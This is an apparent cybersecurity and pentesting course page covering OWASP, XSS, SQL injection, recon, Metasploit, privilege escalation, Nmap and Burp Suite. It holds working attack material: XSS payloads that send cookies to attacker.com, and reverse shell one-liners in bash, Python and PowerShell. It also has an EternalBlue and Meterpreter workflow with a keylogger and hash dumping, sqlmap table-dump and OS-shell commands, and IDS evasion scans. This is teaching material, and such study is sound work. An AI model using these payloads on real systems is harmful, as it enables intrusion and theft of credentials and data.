@@ -1,0 +1,1320 @@
+<!doctype html>
+<html lang="en" data-portal="cybersecurity-vapt" data-depth="2">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Cybersecurity & VAPT — IT University</title>
+  <link rel="stylesheet" href="../assets/css/tokens.css">
+  <link rel="stylesheet" href="../assets/css/reset.css">
+  <link rel="stylesheet" href="../assets/css/portal-themes.css">
+  <link rel="stylesheet" href="../assets/css/layout.css">
+  <link rel="stylesheet" href="../assets/css/components.css">
+  <link rel="stylesheet" href="../assets/css/quiz.css">
+</head>
+<body class="page-body">
+<div id="header-placeholder"></div>
+
+<div class="portal-layout">
+  <aside class="sidebar">
+    <div class="sidebar__section">
+      <div class="sidebar__heading">Foundations</div>
+      <a href="#fundamentals" class="sidebar__link">🔐 CIA Triad & Cryptography</a>
+      <a href="#owasp" class="sidebar__link">🌐 OWASP Top 10</a>
+      <a href="#xss" class="sidebar__link">💉 XSS Deep Dive</a>
+      <a href="#sqli" class="sidebar__link">🗄️ SQL Injection</a>
+    </div>
+    <div class="sidebar__section">
+      <div class="sidebar__heading">VAPT Methodology</div>
+      <a href="#recon" class="sidebar__link">🔍 Reconnaissance</a>
+      <a href="#exploitation" class="sidebar__link">⚔️ Exploitation</a>
+      <a href="#privesc" class="sidebar__link">⬆️ Privilege Escalation</a>
+      <a href="#reporting" class="sidebar__link">📋 Reporting & CVSS</a>
+    </div>
+    <div class="sidebar__section">
+      <div class="sidebar__heading">Tools</div>
+      <a href="#nmap" class="sidebar__link">🗺️ Nmap Deep Dive</a>
+      <a href="#burp" class="sidebar__link">🕷️ Burp Suite</a>
+      <a href="#exploitation" class="sidebar__link">💥 Metasploit</a>
+      <a href="#password" class="sidebar__link">🔑 Password Attacks</a>
+    </div>
+    <div class="sidebar__section">
+      <div class="sidebar__heading">Defensive Security</div>
+      <a href="#cloud-sec" class="sidebar__link">☁️ Cloud Security</a>
+      <a href="#soc" class="sidebar__link">🛡️ SOC & SIEM</a>
+      <a href="#mitre" class="sidebar__link">🗂️ MITRE ATT&CK</a>
+    </div>
+    <div class="sidebar__section">
+      <div class="sidebar__heading">Advanced Topics</div>
+      <a href="#malware-analysis" class="sidebar__link">🦠 Malware Analysis</a>
+      <a href="#threat-hunting" class="sidebar__link">🎯 Threat Hunting & DFIR</a>
+      <a href="#zero-trust" class="sidebar__link">🛡️ Zero Trust & IAM</a>
+      <a href="#appsec" class="sidebar__link">🔬 AppSec Testing</a>
+    </div>
+    <div class="sidebar__section">
+      <div class="sidebar__heading">Practice</div>
+      <a href="#labs" class="sidebar__link">🧪 Labs & CTF</a>
+      <a href="#interview" class="sidebar__link">🎯 Interview Q&A</a>
+      <a href="#certs" class="sidebar__link">🏆 Certifications</a>
+      <a href="#quiz-section" class="sidebar__link">🧠 Quiz</a>
+    </div>
+  </aside>
+
+  <main class="content">
+    <h1>🔒 Cybersecurity & VAPT</h1>
+    <p style="color:var(--text-dim);font-size:var(--text-lg);margin-bottom:var(--gap-xl)">From cryptography fundamentals to full penetration testing methodology. CEH / OSCP / eJPT aligned content with real-world attack and defense scenarios.</p>
+
+    <!-- ===== FUNDAMENTALS ===== -->
+    <section id="fundamentals">
+      <h2>🔐 CIA Triad & Cryptography</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Core Security Principles</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:fundamentals">Mark Complete</button>
+        </div>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Principle</th><th>Definition</th><th>Attacks Against</th><th>Controls</th></tr></thead>
+            <tbody>
+              <tr><td><strong>Confidentiality</strong></td><td>Data accessible only to authorized parties</td><td>Eavesdropping, man-in-the-middle, data exfiltration</td><td>Encryption, ACLs, MFA, VPN</td></tr>
+              <tr><td><strong>Integrity</strong></td><td>Data remains accurate and unaltered</td><td>SQL injection, tampering, file modification</td><td>Hashing, digital signatures, checksums, WORM storage</td></tr>
+              <tr><td><strong>Availability</strong></td><td>Systems accessible when needed</td><td>DDoS, ransomware, hardware failure</td><td>Redundancy, backups, CDN, rate limiting</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Cryptography Reference</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Algorithm</th><th>Type</th><th>Key Size</th><th>Use Case</th><th>Status</th></tr></thead>
+            <tbody>
+              <tr><td>AES-256</td><td>Symmetric block cipher</td><td>256-bit</td><td>File/disk encryption, TLS session data</td><td>✅ Secure</td></tr>
+              <tr><td>RSA-2048</td><td>Asymmetric</td><td>2048-bit</td><td>Key exchange, digital signatures</td><td>✅ Secure (min 2048)</td></tr>
+              <tr><td>ECDSA P-256</td><td>Asymmetric (elliptic curve)</td><td>256-bit = RSA 3072</td><td>TLS certs, SSH, JWT signing</td><td>✅ Secure</td></tr>
+              <tr><td>bcrypt</td><td>Password hashing (KDF)</td><td>N/A (work factor)</td><td>Password storage</td><td>✅ Use this</td></tr>
+              <tr><td>Argon2id</td><td>Password hashing (KDF)</td><td>N/A (memory-hard)</td><td>Password storage (winner PHC)</td><td>✅ Best choice</td></tr>
+              <tr><td>MD5</td><td>Hash (broken)</td><td>128-bit</td><td>Nothing security-critical</td><td>❌ Broken</td></tr>
+              <tr><td>SHA-1</td><td>Hash (deprecated)</td><td>160-bit</td><td>Git object IDs (collision found)</td><td>❌ Avoid for security</td></tr>
+              <tr><td>SHA-256</td><td>Hash</td><td>256-bit</td><td>Data integrity, HMAC, TLS</td><td>✅ Secure</td></tr>
+              <tr><td>DES/3DES</td><td>Symmetric (broken)</td><td>56/168-bit</td><td>Legacy only</td><td>❌ Deprecated</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>TLS 1.3 Handshake</h3>
+        <pre><code># TLS 1.3 Handshake (1 RTT)
+# Client → Server: ClientHello (supported ciphers, key share)
+# Server → Client: ServerHello + Certificate + CertificateVerify + Finished
+#   - Selects cipher suite: TLS_AES_256_GCM_SHA384
+#   - Sends public key (ECDH key share)
+# Client → Server: Finished
+# Connection established. Application data flows.
+
+# Perfect Forward Secrecy (PFS): TLS 1.3 mandates ECDHE
+# Each session uses a new ephemeral key pair
+# Even if server private key is compromised later,
+# past session data cannot be decrypted.
+
+# Check server TLS configuration
+openssl s_client -connect target.com:443 -tls1_3
+nmap --script ssl-enum-ciphers -p 443 target.com
+
+# Check for weak ciphers (testssl.sh)
+./testssl.sh --severity HIGH target.com</code></pre>
+
+        <h3>PKI & Certificate Chain</h3>
+        <pre><code># Certificate chain: Root CA → Intermediate CA → End-entity cert
+# Browser trusts Root CAs (built-in trust store)
+# Intermediate CAs signed by Root → sign site certs
+
+# Inspect a certificate
+openssl x509 -in cert.pem -noout -text
+openssl s_client -connect google.com:443 -showcerts
+
+# Check cert expiry
+echo | openssl s_client -host myapp.com -port 443 2>/dev/null \
+  | openssl x509 -noout -dates
+
+# Generate self-signed cert for testing
+openssl req -x509 -newkey rsa:4096 -keyout key.pem \
+  -out cert.pem -days 365 -nodes \
+  -subj "/CN=myapp.local/O=Test"</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== OWASP ===== -->
+    <section id="owasp">
+      <h2>🌐 OWASP Top 10</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">OWASP Top 10 2021 — Deep Dive</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:owasp">Mark Complete</button>
+        </div>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>#</th><th>Vulnerability</th><th>Example Attack</th><th>Prevention</th></tr></thead>
+            <tbody>
+              <tr><td>A01</td><td>Broken Access Control</td><td>IDOR — change orderId in URL to view other user's orders</td><td>Enforce server-side authz on every request</td></tr>
+              <tr><td>A02</td><td>Cryptographic Failures</td><td>Sensitive data in HTTP (no TLS), MD5 password hashes</td><td>TLS everywhere, Argon2/bcrypt, no secrets in code</td></tr>
+              <tr><td>A03</td><td>Injection (SQL, LDAP, OS)</td><td>SQL: <code>' OR '1'='1</code>, OS: <code>; rm -rf /</code></td><td>Parameterized queries, input validation, WAF</td></tr>
+              <tr><td>A04</td><td>Insecure Design</td><td>No rate limiting on OTP → brute force</td><td>Threat modeling, secure design patterns, abuse cases</td></tr>
+              <tr><td>A05</td><td>Security Misconfiguration</td><td>Default creds, S3 bucket public, debug mode in prod</td><td>Hardening guides, IaC scanning, disable debug</td></tr>
+              <tr><td>A06</td><td>Vulnerable Components</td><td>Log4Shell (CVE-2021-44228), Struts 2 RCE</td><td>SCA tools (Trivy, Snyk), automated patching, SBOM</td></tr>
+              <tr><td>A07</td><td>Auth & Session Failures</td><td>Weak passwords, no MFA, predictable session IDs</td><td>Strong password policy, MFA, HttpOnly/Secure cookies</td></tr>
+              <tr><td>A08</td><td>Software/Data Integrity</td><td>Malicious npm package, CI/CD pipeline injection</td><td>Code signing, verify checksums, SLSA framework</td></tr>
+              <tr><td>A09</td><td>Security Logging Failures</td><td>No logs for failed logins — attack undetected</td><td>Centralized logging, alert on anomalies, SIEM</td></tr>
+              <tr><td>A10</td><td>SSRF</td><td>Fetch internal AWS metadata: <code>http://169.254.169.254</code></td><td>Allowlist outbound URLs, block metadata IPs at WAF</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>SSRF — Server-Side Request Forgery</h3>
+        <pre><code># Vulnerable code (Python Flask)
+@app.route('/fetch')
+def fetch_url():
+    url = request.args.get('url')
+    response = requests.get(url)   # SSRF! No validation!
+    return response.content
+
+# SSRF attack: extract AWS credentials
+# GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
+# Response: {"AccessKeyId":"ASIA...", "SecretAccessKey":"..."}
+
+# Secure version: allowlist approach
+ALLOWED_HOSTS = ['api.trusted.com', 'cdn.trusted.com']
+
+@app.route('/fetch')
+def fetch_url_safe():
+    url = request.args.get('url')
+    parsed = urlparse(url)
+    if parsed.hostname not in ALLOWED_HOSTS:
+        return 'Forbidden', 403
+    if parsed.scheme not in ('http', 'https'):
+        return 'Forbidden', 403
+    response = requests.get(url, timeout=5, allow_redirects=False)
+    return response.content</code></pre>
+
+        <h3>JWT Attacks</h3>
+        <pre><code># JWT format: header.payload.signature (base64url encoded)
+# header: {"alg":"HS256","typ":"JWT"}
+# payload: {"sub":"user123","role":"user","iat":...}
+
+# Attack 1: alg=none (remove signature)
+# Tamper payload to role:"admin", set alg:"none", remove signature
+# Vulnerable if server accepts alg:none
+
+# Attack 2: RS256 → HS256 confusion
+# If server has RSA public key and uses it as HMAC secret when alg=HS256
+# Attacker signs token with public key using HS256
+
+# Attack 3: Weak secret brute force
+hashcat -a 0 -m 16500 jwt_token.txt rockyou.txt  # crack JWT secret
+
+# Fix: always validate algorithm header
+import jwt
+# Bad: jwt.decode(token, key)
+# Good: jwt.decode(token, key, algorithms=["HS256"])  # whitelist algorithm
+
+# Check JWT online: jwt.io (development only, never prod secrets!)</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== XSS ===== -->
+    <section id="xss">
+      <h2>💉 XSS — Cross-Site Scripting</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Reflected, Stored, DOM-based XSS</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:xss">Mark Complete</button>
+        </div>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Type</th><th>How it works</th><th>Persistence</th><th>Example</th></tr></thead>
+            <tbody>
+              <tr><td>Reflected</td><td>Payload in URL → server reflects in response</td><td>None (victim clicks crafted link)</td><td><code>?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
+              <tr><td>Stored</td><td>Payload saved in DB → served to all users</td><td>Persistent</td><td>Comment: <code>&lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;</code></td></tr>
+              <tr><td>DOM-based</td><td>Payload executed via client-side JS, server not involved</td><td>Depends on source</td><td><code>document.write(location.hash)</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>XSS Payloads & Cookie Theft</h3>
+        <pre><code># Basic XSS payloads
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror="alert('XSS')"&gt;
+&lt;svg onload="alert('XSS')"&gt;
+&lt;iframe src="javascript:alert('XSS')"&gt;
+
+# Filter bypass
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;           # case variation
+&lt;script&gt;alert(1)&lt;/script&gt;     # unicode escape
+&lt;img src=x onerror=alert(1)&gt;
+
+# Cookie theft payload (stored XSS)
+&lt;script&gt;
+new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
+&lt;/script&gt;
+
+# Session hijack + redirect
+&lt;script&gt;
+fetch('https://attacker.com/log', {
+  method: 'POST',
+  body: JSON.stringify({cookies: document.cookie, url: location.href})
+});
+&lt;/script&gt;
+
+# Defenses
+# 1. Escape output: use textContent not innerHTML
+// VULNERABLE
+div.innerHTML = userInput;
+// SAFE
+div.textContent = userInput;
+
+# 2. Content Security Policy (CSP)
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM123'; object-src 'none'
+
+# 3. HttpOnly + Secure cookies (prevent JS cookie theft)
+Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
+
+# 4. DOMPurify — sanitize HTML when you need to render it
+import DOMPurify from 'dompurify';
+div.innerHTML = DOMPurify.sanitize(userInput);</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== SQL INJECTION ===== -->
+    <section id="sqli">
+      <h2>🗄️ SQL Injection</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">SQLi Types, sqlmap, Prevention</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:sqli">Mark Complete</button>
+        </div>
+        <h3>SQLi Types</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Type</th><th>Description</th><th>Payload Example</th></tr></thead>
+            <tbody>
+              <tr><td>Classic (In-band)</td><td>Results returned directly in response</td><td><code>' OR '1'='1</code></td></tr>
+              <tr><td>Union-based</td><td>UNION SELECT to retrieve data from other tables</td><td><code>' UNION SELECT username,password FROM users--</code></td></tr>
+              <tr><td>Error-based</td><td>DB error messages reveal information</td><td><code>' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--</code></td></tr>
+              <tr><td>Boolean-based Blind</td><td>No output — infer data from true/false responses</td><td><code>' AND SUBSTRING(username,1,1)='a'--</code></td></tr>
+              <tr><td>Time-based Blind</td><td>No output — infer from response time</td><td><code>' AND IF(1=1,SLEEP(5),0)--</code></td></tr>
+              <tr><td>Out-of-band</td><td>Exfiltrate data via DNS/HTTP</td><td><code>' LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\x'))--</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Vulnerable vs Secure Code</h3>
+        <pre><code># ===== VULNERABLE =====
+# Python (f-string concatenation)
+query = f"SELECT * FROM users WHERE username='{username}'"
+# Attack: username = ' OR '1'='1' --
+# Result: SELECT * FROM users WHERE username='' OR '1'='1' --'
+# Returns ALL users!
+
+# ===== SECURE =====
+# Parameterized query
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+
+# ORM (Django — always parameterized)
+User.objects.filter(username=username)
+
+# Java PreparedStatement
+PreparedStatement ps = conn.prepareStatement(
+    "SELECT * FROM users WHERE username = ?");
+ps.setString(1, username);
+
+# sqlmap (authorized testing only!)
+sqlmap -u "http://target.com/login" --data "user=test&pass=test" \
+  --dbs --batch                           # enumerate databases
+sqlmap -u "http://target.com/api?id=1" \
+  --dump -T users -D webapp               # dump users table
+sqlmap -u "http://target.com/api?id=1" \
+  --os-shell                              # get OS shell (if privilege allows)
+sqlmap -u "http://target.com/api?id=1" \
+  --cookie "PHPSESSID=abc" --level=5 --risk=3  # authenticated, thorough</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== RECON ===== -->
+    <section id="recon">
+      <h2>🔍 Reconnaissance</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Passive & Active Recon</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:recon">Mark Complete</button>
+        </div>
+        <h3>Passive Recon (OSINT)</h3>
+        <pre><code># Whois / DNS
+whois target.com
+dig target.com A NS MX TXT
+dig target.com AXFR @ns1.target.com   # zone transfer (often blocked)
+dnsenum target.com                     # enumerate subdomains
+subfinder -d target.com               # passive subdomain discovery
+amass enum -passive -d target.com
+
+# Shodan (internet-connected devices)
+shodan search "org:TargetCorp"
+shodan search "hostname:target.com"
+shodan search "ssl.cert.subject.cn:target.com port:443"
+
+# Google Dorking
+site:target.com filetype:pdf
+site:target.com inurl:admin
+site:target.com intitle:"Index of"
+"target.com" ext:sql OR ext:bak OR ext:conf
+
+# Certificate transparency logs
+curl -s "https://crt.sh/?q=%.target.com&output=json" \
+  | jq '.[].name_value' | sort -u
+
+# theHarvester — emails, subdomains, IPs
+theHarvester -d target.com -l 500 -b all</code></pre>
+
+        <h3>Active Recon</h3>
+        <pre><code># Network discovery
+nmap -sn 192.168.1.0/24                  # ping sweep (host discovery)
+nmap -sV -p- --min-rate=5000 target.com  # all ports, version detection
+nmap -A -T4 target.com                   # OS detect + script scan
+
+# Web enumeration
+gobuster dir -u http://target.com \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,html,txt -t 50
+
+ffuf -u http://target.com/FUZZ \
+  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
+  -mc 200,301,302 -t 100
+
+# Subdomain bruteforce
+gobuster dns -d target.com \
+  -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Technology fingerprinting
+whatweb target.com
+wappalyzer (browser extension)</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== EXPLOITATION ===== -->
+    <section id="exploitation">
+      <h2>⚔️ Exploitation</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Metasploit Workflow</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:exploitation">Mark Complete</button>
+        </div>
+        <pre><code># Metasploit Framework (authorized pentesting only!)
+msfconsole
+
+# Search for exploits
+search type:exploit platform:windows cve:2021
+search eternalblue
+
+# Use a module
+use exploit/windows/smb/ms17_010_eternalblue
+info                        # show module info
+show options                # required options
+set RHOSTS 192.168.1.50
+set LHOST 192.168.1.100
+set LPORT 4444
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+check                       # check if target is vulnerable
+exploit / run               # launch exploit
+
+# Meterpreter post-exploitation
+sysinfo                     # system info
+getuid                      # current user
+getsystem                   # attempt privilege escalation
+hashdump                    # dump SAM hashes (needs SYSTEM)
+ps                          # list processes
+migrate 1234                # migrate to another process
+screenshot                  # take screenshot
+keyscan_start               # start keylogger
+download C:/Users/Admin/Desktop/flag.txt
+upload payload.exe C:/Windows/Temp/
+shell                       # drop to OS shell
+run post/multi/recon/local_exploit_suggester  # find privesc</code></pre>
+
+        <h3>Reverse Shell One-Liners</h3>
+        <pre><code># Bash reverse shell
+bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1
+
+# Python reverse shell
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PowerShell reverse shell
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'>'; $se=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($se,0,$se.Length)};$c.Close()"
+
+# Listener (on attacker machine)
+nc -lvnp 4444
+# Or: rlwrap nc -lvnp 4444  (readline support)
+
+# Upgrade to full TTY
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# CTRL+Z
+stty raw -echo; fg
+reset
+export TERM=xterm
+stty rows 50 columns 200</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== PRIVILEGE ESCALATION ===== -->
+    <section id="privesc">
+      <h2>⬆️ Privilege Escalation</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Linux & Windows PrivEsc Checklist</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:privesc">Mark Complete</button>
+        </div>
+        <h3>Linux Privilege Escalation</h3>
+        <pre><code># Automated enumeration
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+python3 linuxprivchecker.py
+
+# Manual checklist
+id && whoami && groups
+sudo -l                               # what can current user sudo?
+# sudo entry: (ALL) NOPASSWD: /usr/bin/vim → vim → :!bash
+
+cat /etc/passwd | grep -v nologin    # other users
+cat /etc/crontab && ls /etc/cron.*   # scheduled jobs (writable scripts?)
+
+find / -perm -4000 -type f 2>/dev/null  # SUID binaries
+# Check gtfobins.github.io for exploitation of SUID binaries
+# e.g., /usr/bin/find -exec /bin/bash -p \;
+
+find / -writable -type f 2>/dev/null | grep -v proc  # writable files
+find / -perm -2 ! -type l 2>/dev/null                 # world-writable files
+
+cat /etc/sudoers 2>/dev/null
+cat ~/.bash_history                   # check history for creds
+
+# PATH hijacking
+echo $PATH
+# If writable dir is first in PATH: create fake binary
+mkdir -p /tmp/hijack && export PATH=/tmp/hijack:$PATH
+echo '/bin/bash -p' > /tmp/hijack/ls && chmod +x /tmp/hijack/ls
+
+# Kernel exploits
+uname -a                              # kernel version
+searchsploit "linux kernel 4.4"      # search exploit-db</code></pre>
+
+        <h3>Windows Privilege Escalation</h3>
+        <pre><code># Automated
+# WinPEAS
+.\winPEASx64.exe
+# PowerSploit
+Import-Module .\PowerUp.ps1; Invoke-AllChecks
+
+# Manual
+whoami /all                           # current privileges + groups
+net user && net localgroup Administrators
+systeminfo                            # OS version, patches
+wmic qfe list brief                   # installed patches
+tasklist /svc                         # running services
+
+# Unquoted service paths
+wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
+
+# Writable service
+sc qc "ServiceName"                   # view service config
+accesschk.exe -uwcqv * "ServiceName" # check permissions
+
+# Token impersonation (if SeImpersonatePrivilege)
+# JuicyPotato, PrintSpoofer, or RoguePotato
+
+# AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== REPORTING ===== -->
+    <section id="reporting">
+      <h2>📋 Reporting & CVSS</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">CVSS Scoring & Pentest Report Structure</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:reporting">Mark Complete</button>
+        </div>
+        <h3>CVSS v3.1 Score Calculation</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Metric</th><th>Values</th><th>Description</th></tr></thead>
+            <tbody>
+              <tr><td>Attack Vector (AV)</td><td>Network/Adjacent/Local/Physical</td><td>How is the vulnerability exploited?</td></tr>
+              <tr><td>Attack Complexity (AC)</td><td>Low/High</td><td>Conditions beyond attacker's control?</td></tr>
+              <tr><td>Privileges Required (PR)</td><td>None/Low/High</td><td>What access needed before exploiting?</td></tr>
+              <tr><td>User Interaction (UI)</td><td>None/Required</td><td>Does a human need to take action?</td></tr>
+              <tr><td>Scope (S)</td><td>Unchanged/Changed</td><td>Can it impact other components?</td></tr>
+              <tr><td>Confidentiality (C)</td><td>None/Low/High</td><td>Impact on data confidentiality</td></tr>
+              <tr><td>Integrity (I)</td><td>None/Low/High</td><td>Impact on data integrity</td></tr>
+              <tr><td>Availability (A)</td><td>None/Low/High</td><td>Impact on service availability</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <pre><code># CVSS Severity Ranges
+# 0.0       = None
+# 0.1 - 3.9 = Low
+# 4.0 - 6.9 = Medium
+# 7.0 - 8.9 = High
+# 9.0 - 10.0 = Critical
+
+# Example: Log4Shell (CVE-2021-44228)
+# AV:N / AC:L / PR:N / UI:N / S:C / C:H / I:H / A:H = CVSS 10.0 (Critical)
+
+# Pentest Report Structure:
+# 1. Executive Summary (non-technical, business impact)
+# 2. Scope & Rules of Engagement
+# 3. Methodology (OWASP Testing Guide, PTES, OSSTMM)
+# 4. Findings (per vulnerability):
+#    - Title, CVE, CVSS Score
+#    - Description & Root Cause
+#    - Proof of Concept (screenshots, output)
+#    - Business Impact
+#    - Remediation Recommendations (specific steps)
+#    - References
+# 5. Risk Matrix (likelihood × impact)
+# 6. Remediation Roadmap
+# 7. Appendix (tool output, methodology details)</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== NMAP ===== -->
+    <section id="nmap">
+      <h2>🗺️ Nmap Deep Dive</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Scan Types, Scripts & Evasion</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:nmap">Mark Complete</button>
+        </div>
+        <pre><code># Scan Types
+nmap -sS target    # SYN scan (stealth, default with root)
+nmap -sT target    # TCP Connect (no root needed, noisier)
+nmap -sU target    # UDP scan (slow, requires root)
+nmap -sA target    # ACK scan (detect firewall rules)
+nmap -sN target    # NULL scan (no flags set)
+nmap -sX target    # Xmas scan (FIN,PSH,URG set)
+nmap -sF target    # FIN scan
+
+# Port selection
+nmap -p 80,443,8080 target     # specific ports
+nmap -p 1-1000 target          # range
+nmap -p- target                # all 65535 ports
+nmap --top-ports 100 target    # top 100 common ports
+
+# Version & OS detection
+nmap -sV target               # service version
+nmap -O target                # OS fingerprint (root)
+nmap -A target                # OS + version + scripts + traceroute
+
+# Performance
+nmap -T4 target               # timing: paranoid(0), sneaky(1), polite(2), normal(3), aggressive(4), insane(5)
+nmap --min-rate 5000 target   # at least 5000 pkts/sec
+nmap --max-retries 1 target
+
+# NSE Scripts
+nmap --script vuln target                         # all vuln scripts
+nmap --script smb-vuln-* -p 445 target            # SMB vulnerabilities
+nmap --script http-title -p 80,443 target         # page titles
+nmap --script ssl-enum-ciphers -p 443 target      # TLS ciphers
+nmap --script ftp-anon -p 21 target               # anonymous FTP
+nmap --script http-robots.txt -p 80 target        # robots.txt
+nmap --script default,safe target                 # safe scripts
+
+# Evasion (IDS/IPS bypass)
+nmap -D RND:10 target              # decoy scan (fake source IPs)
+nmap -f target                     # fragment packets
+nmap --mtu 16 target              # custom MTU
+nmap --data-length 25 target      # add random data
+nmap --spoof-mac 0 target         # random MAC
+nmap -sI zombie_host target       # idle scan (completely blind)
+nmap --scan-delay 500ms target    # slow scan
+
+# Output formats
+nmap -oN scan.txt target          # normal
+nmap -oX scan.xml target          # XML (import to Metasploit)
+nmap -oG scan.gnmap target        # grepable
+nmap -oA scan target              # all formats</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== BURP SUITE ===== -->
+    <section id="burp">
+      <h2>🕷️ Burp Suite</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Intercept, Scanner, Intruder Attack Types</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:burp">Mark Complete</button>
+        </div>
+        <h3>Core Modules</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Module</th><th>Use</th></tr></thead>
+            <tbody>
+              <tr><td>Proxy</td><td>Intercept/modify HTTP requests/responses between browser and server</td></tr>
+              <tr><td>Repeater</td><td>Manually resend and modify requests. Test for SQLi, XSS, IDOR</td></tr>
+              <tr><td>Intruder</td><td>Automated attack tool: brute force, fuzzing, credential stuffing</td></tr>
+              <tr><td>Scanner (Pro)</td><td>Automated DAST — finds SQLi, XSS, SSRF, misconfigs</td></tr>
+              <tr><td>Decoder</td><td>Encode/decode: Base64, URL, HTML, hex, gzip</td></tr>
+              <tr><td>Comparer</td><td>Diff two requests/responses to spot differences</td></tr>
+              <tr><td>Collaborator</td><td>Out-of-band detection: blind SQLi, SSRF, XXE via DNS/HTTP callbacks</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Intruder Attack Types</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Attack Type</th><th>Positions</th><th>Use Case</th></tr></thead>
+            <tbody>
+              <tr><td>Sniper</td><td>One position at a time</td><td>Fuzz one parameter (SQLi, XSS payloads)</td></tr>
+              <tr><td>Battering Ram</td><td>Same payload in ALL positions</td><td>Username = password credential test</td></tr>
+              <tr><td>Pitchfork</td><td>N positions, N lists — one item from each simultaneously</td><td>username:password pairs from separate wordlists</td></tr>
+              <tr><td>Cluster Bomb</td><td>All combinations of all lists</td><td>Brute force (small keyspace)</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Tips</h3>
+        <pre><code># Capture HTTPS traffic
+# Add Burp CA cert to browser trust store
+# Settings: Proxy > Intercept > Install CA cert
+
+# Find hidden endpoints
+# Target > Site Map > right-click > Spider/Scan
+
+# Test IDOR
+# Capture request: GET /api/orders/1234
+# Send to Repeater → change 1234 to 1235, 1, 100 etc.
+
+# Test for SQL injection in Repeater
+# Add ' to parameter values → look for errors
+# Add ' ORDER BY 1-- and increment until error
+
+# Export findings
+# Scanner > Issues > right-click > Report issue</code></pre>
+      </div>
+    </section>
+
